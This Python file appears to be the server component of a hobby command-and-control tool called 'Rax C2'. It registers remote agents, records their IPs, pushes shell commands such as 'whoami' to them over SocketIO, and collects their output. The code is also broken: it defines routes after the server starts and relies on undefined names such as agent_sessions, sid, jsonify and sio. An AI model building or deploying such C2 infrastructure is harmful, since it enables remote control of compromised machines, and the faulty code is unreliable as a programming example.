# === server.py ===
# This is the main server component for Rax C2.
# It uses Flask + Flask-SocketIO to handle agent connections, command distribution, and result collection.

from flask import Flask, request  # Flask for HTTP routes
from flask_socketio import SocketIO, emit  # SocketIO for real-time communication with agents
import pyfiglet

# --- ASCII Banner ---
# Banner for a Rax C2 Server file
ascii_banner = pyfiglet.figlet_format("Rax - C2 - Server")
print(ascii_banner)
print("By - @mello-io")
print("-" * 30) # Separator for readability

app = Flask(__name__)
socketio = SocketIO(app)  # Create a SocketIO server

agents = {}  # Dictionary to keep track of agents (agent_id : IP)
agent_sid = None  # Global var to store agent session ID

@app.route('/register', methods=['POST'])
def register():
    # Called when an agent sends a POST request to register
    ip = request.remote_addr
    agent_id = request.json.get("id")
    agents[agent_id] = ip
    print(f"[+] Agent {agent_id} registered from {ip}")
    return {"status": "registered"}

@socketio.on('exec_result')
def handle_result(data):
    # Handle incoming command output from the agent
#    print(f"[{data['id']}] Output:\n{data['output']}")
    print(f"[Agent Output] {data['output']}")    

@socketio.on('connect')
def handle_connect():
    print("[+] Agent connected:", request.sid)
    # Called when an agent connects

#    agent_sessions[request.sid] = request.sid
#    agent_sessions['latest'] = request.sid
    global agent_sid
    agent_sid = request.sid
    print("[+] Agent connected:", agent_sid)

    # Test: send command directly to agent
    socketio.emit('command', "whoami", room=agent_sid)    

if __name__ == "__main__":
    # Start the SocketIO server with SSL support
    # Make sure cert.pem and key.pem are in the same folder
    socketio.run(app, host='0.0.0.0', port=5000)#, ssl_context=('cert.pem', 'key.pem'))

# === HTTP Route to Send Commands ===
@app.route('/send/sid', methods=['POST'])
def send_command(agent_id):
    data = request.get_json()
    cmd = data.get('cmd')
    if agent_id in agent_sessions:
        socketio.emit('command', cmd, room=sid)
        print(f"[>] Sent command: {cmd} to agent {sid}")
        return jsonify({"status": "command sent"}), 200
    else:
        return jsonify({"error": "Agent not found"}), 404

@sio.on('output')
def handle_output(sid, data):
    print(f"[{sid}] Output:\n{data}")
                                                
